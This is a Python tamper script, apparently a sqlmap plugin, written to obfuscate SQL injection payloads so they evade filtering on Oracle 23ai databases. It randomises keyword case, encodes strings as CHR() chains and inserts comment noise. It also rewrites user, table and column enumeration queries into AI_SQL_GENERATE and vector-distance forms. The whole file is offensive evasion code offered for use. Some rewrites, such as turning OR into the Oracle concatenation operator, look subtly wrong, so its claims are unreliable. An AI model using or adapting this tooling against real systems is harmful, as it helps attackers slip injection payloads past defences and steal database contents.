#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : oracle23ai_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import random
import re

def general_obfuscate(payload):
    if not payload:
        return payload

    keywords = ["SELECT", "FROM", "WHERE", "UNION", "AI_SQL_GENERATE", "VECTOR_DISTANCE", "COSINE", "DUAL"]
    for kw in keywords:
        payload = re.sub(r"\b%s\b" % kw, lambda m: "".join(c.upper() if random.random() > 0.5 else c.lower() for c in m.group(0)), payload, flags=re.IGNORECASE)

    payload = re.sub(r"'([a-zA-Z0-9_/]+)'", lambda m: "||".join("CHR(%d)" % ord(c) for c in m.group(1)), payload)

    def advanced_noise(match):
        return random.choice(["/**/", "\n", "\t", "/*%s*/" % "".join(random.choices("ABCDEF", k=4))])
    payload = re.sub(r"\s+", advanced_noise, payload)

    payload = payload.replace(" AND ", " && ").replace(" OR ", " || ")

    for iden in ["USER", "DUAL", "ALL_TABLES", "ALL_TAB_COLUMNS"]:
        payload = re.sub(r"\b%s\b" % iden, '"%s"' % iden, payload, flags=re.IGNORECASE)

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "SELECT USER FROM DUAL" in payload.upper():
        payload = payload.replace("SELECT USER FROM DUAL", "SELECT AI_SQL_GENERATE('Show me the current database user') FROM DUAL")

    if "WHERE" in payload.upper() and "=" in payload:
        payload = re.sub(r"(\w+)\s*=\s*'(\w+)'", r"VECTOR_DISTANCE(VECTOR_EMBEDDING(\1), VECTOR_EMBEDDING('\2'), COSINE) < 0.1", payload)

    if "FROM ALL_TABLES" in payload.upper():
        payload = payload.replace("FROM ALL_TABLES", "FROM (SELECT AI_SQL_GENERATE('List all user tables') FROM DUAL)")

    if "FROM ALL_TAB_COLUMNS" in payload.upper():
        payload = payload.replace("FROM ALL_TAB_COLUMNS", "FROM (SELECT AI_SQL_GENERATE('Show all columns for table '||TABLE_NAME) FROM DUAL)")

    return general_obfuscate(payload)
